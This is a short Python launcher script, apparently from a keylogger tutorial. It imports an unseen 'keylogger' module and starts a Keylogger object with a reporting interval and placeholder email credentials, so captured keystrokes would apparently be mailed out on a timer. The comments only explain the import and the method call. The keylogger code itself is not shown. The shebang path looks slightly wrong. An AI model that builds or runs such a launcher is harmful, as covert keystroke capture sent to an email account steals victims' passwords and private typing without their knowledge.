#!/usr/share/python3

import keylogger          # calling the keylogger script that was written earlier

my_keylogger = keylogger.Keylogger(<time_interval>, "<email>", "<password>")        # keylogger was the script name and Keylogger was the class name
my_keylogger.start()                        # my_keylogger has the instance of keylogger.Keylogger() and the start is the method that we are calling from the class

